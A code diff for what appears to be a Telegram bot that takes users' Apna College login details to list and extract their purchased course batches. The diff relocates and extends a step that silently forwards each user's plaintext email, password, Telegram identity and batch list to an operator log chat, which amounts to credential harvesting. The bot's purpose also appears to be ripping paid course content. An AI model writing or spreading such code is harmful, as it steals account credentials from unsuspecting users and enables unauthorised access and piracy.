@@ -250,14 +250,6 @@ async def apna_handler(app, m):
     )
 
     email, password = parse_combo(cred_msg.text)
-    await app.send_message(
-        PREMIUM_LOGS,
-        f"🔐 APNA COLLEGE\n\n"
-        f"📧 Email: <code>{email}</code>\n"
-        f"🔑 Password: <code>{password}</code>\n"
-        f"👤 User: {m.from_user.mention}\n"
-        f"🆔 ID: <code>{m.from_user.id}</code>"
-    )
 
     if not email or not password:
         return await m.reply_text("Invalid format.")
@@ -285,12 +277,25 @@ async def apna_handler(app, m):
     if not batches:
         session.close()
         return await status.edit_text("❌ No purchased batches found.")
+    batch_list = "\n".join(
+        f"{i}.{b['title']}"
+        for i, b in enumerate(batches, start=1)
+    )
 
     txt = "📚 Available Batches:\n\n"
 
     for i, b in enumerate(batches, start=1):
         txt += f"{i}. {b['title']}\n"
-
+    await app.send_message(
+        PREMIUM_LOGS,
+        f"🔐 APNA COLLEGE\n\n"
+        f"📧 Email: <code>{email}</code>\n"
+        f"🔑 Password: <code>{password}</code>\n"
+        f"👤 User: {m.from_user.mention}\n"
+        f"📚 Available Batches: {len(batches)}\n\n"
+        f"<blockquote>{batch_list}</blockquote>"
+        
+    )
     batch_msg = await app.ask(
         m.chat.id,
         txt + "\n\nSend batch number."
@@ -363,6 +368,7 @@ async def apna_handler(app, m):
 
     session.close()
     mention = f'<a href="tg://user?id={m.from_user.id}">{m.from_user.first_name}</a>'
+    total_links = success + len(pdfs)
 
     caption = f"""
         📚 App: Apna College
